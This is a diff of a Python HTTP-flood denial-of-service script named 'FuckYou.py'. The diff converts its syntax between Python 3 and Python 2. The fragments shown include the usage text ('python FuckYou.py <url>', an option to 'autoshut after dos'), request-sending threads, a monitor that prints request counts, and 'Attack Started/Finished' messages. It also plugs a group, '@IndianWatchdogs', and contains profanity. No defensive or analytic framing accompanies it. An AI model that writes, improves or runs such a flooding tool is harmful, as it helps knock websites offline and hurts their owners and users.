@@ -16,13 +16,15 @@
 
 # ----------------------------------------------------------------------------------------------
 
-import urllib.request
-import urllib.error
-import sys
-import threading
-import random
-import re
+import urllib2
 
+import sys
+
+import threading
+
+import random
+
+import re
 
 
 #global params
@@ -130,15 +132,15 @@ def buildblock(size):
 
 def usage():
 
-	print ('---------------------------------------------------')
+	print '---------------------------------------------------'
 
-	print ('USAGE: python FuckYou.py <url>')
+	print 'USAGE: python FuckYou.py <url>'
 
-	print ('you can add "safe" after url, to autoshut after dos')
+	print 'you can add "safe" after url, to autoshut after dos'
 	
-	print ('Join @IndianWatchdogs')
+	print 'Join @IndianWatchdogs'
 
-	print ('---------------------------------------------------')
+	print '---------------------------------------------------'
 
 
 
@@ -180,18 +182,17 @@ def httpcall(url):
 
 			urllib2.urlopen(request)
 
-	except (urllib2.HTTPError, e):
-
+	except urllib2.HTTPError, e:
 
 			#print e.code
 
 			set_flag(1)
 
-			print ('Response Code 500')
+			print 'Response Code 500'
 
 			code=500
 
-	except (urllib2.URLError, e):
+	except urllib2.URLError, e:
 
 			#print e.reason
 
@@ -223,7 +224,7 @@ class HTTPThread(threading.Thread):
 
 					set_flag(2)
 
-		except (Exception, ex):
+		except Exception, ex:
 
 			pass
 
@@ -238,16 +239,15 @@ class MonitorThread(threading.Thread):
 
 		while flag==0:
 
-			if (previous + 100 < request_counter) and (previous != request_counter):
+			if (previous+100<request_counter) & (previous<>request_counter):
 
-
-				print ("%d Requests Sent" % (request_counter))
+				print "%d Requests Sent" % (request_counter)
 
 				previous=request_counter
 
 		if flag==2:
 
-			print ("\n-- FuckYou Attack Finished --")
+			print "\n-- FuckYou Attack Finished --"
 
 
 #execute 
@@ -268,7 +268,7 @@ else:
 
 	else:
 
-		print ("-- FuckYou Attack Started --")
+		print "-- FuckYou Attack Started --"
 
 		if len(sys.argv)== 3:
 
